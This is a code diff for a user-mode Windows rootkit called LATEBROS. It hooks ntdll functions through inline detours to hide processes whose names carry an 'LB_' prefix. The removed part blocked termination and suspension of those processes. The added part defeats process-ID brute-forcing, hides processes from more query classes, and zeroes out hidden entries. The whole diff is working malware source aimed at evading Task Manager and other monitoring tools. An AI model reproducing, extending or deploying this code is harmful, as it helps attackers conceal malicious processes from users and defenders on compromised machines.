@@ -4,94 +4,6 @@
 #define ROOTKIT_PREFIX L"LB_"
 
 /*
-* Function: ntdll!NtTerminateProcess
-* Purpose: Protect any LATEBROS process from a rather unconventional way of termination
-*
-*/
-typedef NTSTATUS(NTAPI *NtTerminateProcesss_t)(HANDLE ProcessHandle, NTSTATUS ExitCode);
-extern "C" char __declspec(dllexport) ntterm_og[0xF] = {}; // ORIGINAL BYTES
-extern "C" NTSTATUS __declspec(dllexport) NTAPI ntterm(HANDLE process_handle, NTSTATUS exit_code)
-{
-	// SOME APPLICATIONS (TASKMGR FOR EXAMPLE) OPEN SPECIFIC HANDLES WITH JUST THE REQUIRED RIGHTS
-	// TO TERMINATE A PROCESS, BUT NOT ENOUGH TO QUERY A MODULE NAME
-	// SO WE HAVE TO OPEN A TEMPORARY HANDLE WITH PROPER RIGHTS
-	// SOMETIMES THEY OPEN A HANDLE WITH ONLY THE TERMINATE FLAG RIGHT (PROCESSHACKER FOR EXAMPLE)
-	// WE CAN NOT DO ANYTHING ABOUT THIS, BUT WE ALREADY PREVENT OPENING HANDLE SO THIS IS ONLY
-	// A FAIL SAFE
-
-	auto process_id = GetProcessId(process_handle);
-	auto temp_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, process_id);
-
-	wchar_t name_buffer[MAX_PATH] = {};
-	auto success = GetModuleBaseNameW(temp_handle, nullptr, name_buffer, MAX_PATH);
-
-	// CLOSE HANDLE REGARDLESS OF OUTCOME TO PREVENT LEAKS
-	CloseHandle(temp_handle);
-
-	// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-	std::wstring name = name_buffer;
-	if (success && name.find(ROOTKIT_PREFIX) != std::wstring::npos)
-		return STATUS_ACCESS_DENIED; // RETURN ACCESS DENIED
-
-	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtTerminateProcess"));
-
-	// RESTORE
-	detour::remove_detour(function_pointer, ntterm_og, sizeof(ntterm_og));
-
-	// CALL
-	auto result = reinterpret_cast<NtTerminateProcesss_t>(function_pointer)(process_handle, exit_code);
-
-	// REHOOK
-	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntterm));
-
-	return result;
-}
-
-/*
-* Function: ntdll!NtSuspendProcess
-* Purpose: Protect any LATEBROS process from a unconventional way of suspension
-*
-*/
-typedef NTSTATUS(NTAPI *NtSuspendProcesss_t)(HANDLE ProcessHandle);
-extern "C" char __declspec(dllexport) ntsusp_og[0xF] = {}; // ORIGINAL BYTES
-extern "C" NTSTATUS __declspec(dllexport) NTAPI ntsusp(HANDLE process_handle)
-{
-	// SOME APPLICATIONS (TASKMGR FOR EXAMPLE) OPEN SPECIFIC HANDLES WITH JUST THE REQUIRED RIGHTS
-	// TO SUSPEND A PROCESS, BUT NOT ENOUGH TO QUERY A MODULE NAME
-	// SO WE HAVE TO OPEN A TEMPORARY HANDLE WITH PROPER RIGHTS
-	// SOMETIMES THEY OPEN A HANDLE WITH ONLY THE SUSPEND FLAG RIGHT (PROCESSHACKER FOR EXAMPLE)
-	// WE CAN NOT DO ANYTHING ABOUT THIS, BUT WE ALREADY PREVENT OPENING HANDLE SO THIS IS ONLY
-	// A FAIL SAFE	
-
-	auto process_id = GetProcessId(process_handle);
-	auto temp_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, process_id);
-
-	wchar_t name_buffer[MAX_PATH] = {};
-	auto success = GetModuleBaseNameW(temp_handle, nullptr, name_buffer, MAX_PATH);
-
-	// CLOSE HANDLE REGARDLESS OF OUTCOME TO PREVENT LEAKS
-	CloseHandle(temp_handle);
-
-	// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-	std::wstring name = name_buffer;
-	if (success && name.find(ROOTKIT_PREFIX) != std::wstring::npos)
-		return STATUS_ACCESS_DENIED; // RETURN ACCESS DENIED
-
-	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtSuspendProcess"));
-
-	// RESTORE
-	detour::remove_detour(function_pointer, ntsusp_og, sizeof(ntsusp_og));
-
-	// CALL
-	auto result = reinterpret_cast<NtSuspendProcesss_t>(function_pointer)(process_handle);
-
-	// REHOOK
-	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntsusp));
-
-	return result;
-}
-
-/*
  * Function: ntdll!NtOpenProcess
  * Purpose: Disguise and protect any LATEBROS process by preventing client-id/process-id bruteforcing
  *
@@ -149,6 +61,35 @@ typedef struct _SYSTEM_PROCESS_INFO
 extern "C" char __declspec(dllexport) qsi_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS system_information_class, PVOID system_information, ULONG system_information_length, PULONG return_length)
 {
+	// PREVENT BRUTEFORCE
+	if (system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x58)/*SystemProcessIdInformation*/)
+	{
+		auto process_id = *reinterpret_cast<uint64_t*>(system_information);
+
+		// REMOVE HOOKS IN CASE PROCESS ID IS PROTECTED
+		auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));
+
+		// RESTORE
+		detour::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));
+
+		// CALL
+		auto handle = OpenProcess(PROCESS_ALL_ACCESS, false, static_cast<DWORD>(process_id));
+
+		// REHOOK
+		detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));
+
+		wchar_t name_buffer[MAX_PATH] = {};
+		if (handle && GetModuleBaseNameW(handle, nullptr, name_buffer, MAX_PATH))
+		{
+			// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
+			std::wstring name = name_buffer;
+			if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
+				return STATUS_INVALID_CID; // RETURN INVALID CLIENT_ID
+		}
+
+		CloseHandle(handle); // CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
+	}
+
 	auto function_pointer = reinterpret_cast<uintptr_t>(NtQuerySystemInformation);
 
 	// RESTORE
@@ -163,9 +104,11 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 	if (!NT_SUCCESS(result))
 		return result;
 
+	// HIDE PROCESSES
 	if (system_information_class == SystemProcessInformation
-		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(53)/*SystemSessionProcessInformation*/
-		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(57)/*SystemExtendedProcessInformation*/)
+		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x35)/*SystemSessionProcessInformation*/
+		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x39)/*SystemExtendedProcessInformation*/
+		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x94)/*SystemFullProcessInformation*/)
 	{
 		auto entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(system_information);
 		auto previous_entry = entry;
@@ -179,9 +122,10 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 				if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 				{
 					previous_entry->NextEntryOffset += entry->NextEntryOffset;	// MAKE PREVIOUS ENTRY POINT TO THE NEXT ENTRY
-					//ZeroMemory(entry, sizeof(_SYSTEM_PROCESS_INFO));			// CLEAR OUR ENTRY, WHY NOT?
+					ZeroMemory(entry, entry->NextEntryOffset);					// CLEAR OUR ENTRY, WHY NOT?
 				}
 			}
+
 
 			previous_entry = entry;
 			entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(reinterpret_cast<uintptr_t>(entry) + entry->NextEntryOffset);
